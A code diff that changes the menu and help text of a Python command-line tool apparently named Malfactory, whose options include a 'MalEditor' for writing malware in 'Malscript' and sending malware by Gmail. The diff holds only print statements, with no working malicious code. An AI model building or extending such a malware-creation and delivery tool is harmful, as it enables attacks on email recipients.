@@ -26,17 +26,28 @@ def clear():
 def options():
     print(" " + purple + bold + "Tool Version: " + rr + str(tool_version) + "\n")
     print(" " + ul + "Please Select From The Menu" + rr + "\n")
+
+    # print(rr + "   [" + purple + "1" + rr + "]\t MalEditor")
+    # print("   [" + purple + "2" + rr + "]\t Send Malware With Email w/ Gmail")
+    # print("   [" + purple + "r" + rr + "]\t Reloads The Screen")
+    #
+    # print("\n   [" + purple + "c" + rr + "]\t Check for Updates(Coming soon)")
+    # print("   [" + red + "u" + rr + "]\t Uninstall Malfactory(Comming soon)")
+    # print("   [" + purple + "99" + rr + "]\t Exit \n")
+
     print(rr + "   [" + purple + "1" + rr + "]\t MalEditor")
     print("   [" + purple + "2" + rr + "]\t Send Malware With Email w/ Gmail")
     print("   [" + purple + "r" + rr + "]\t Reloads The Screen")
 
-    print("\n   [" + purple + "update" + rr + "]\t Check for Updates")
-    print("\n   [" + red + "u" + rr + "]\t " + red + "Uninstall" + rr + " Malfactory(Comming soon)")
-    print("\n   [" + purple + "99" + rr + "]\t Exit \n")
+    print("\n   [" + purple + "c" + rr + "]\t Check for Updates(Coming soon)")
+    print("   [" + red + "u" + rr + "]\t Uninstall Malfactory(Comming soon)")
+    print("   [" + purple + "99" + rr + "]\t Exit \n")
 
 
 def help(command: str):
     print("Help menu")
+    print("[1] MalEditor -is used for making malware using \"Malscript\", you can write and save your scripts here")
+    print("[2] Reloads The Screen -is used for refreshing the screen")
 
 
 def main():
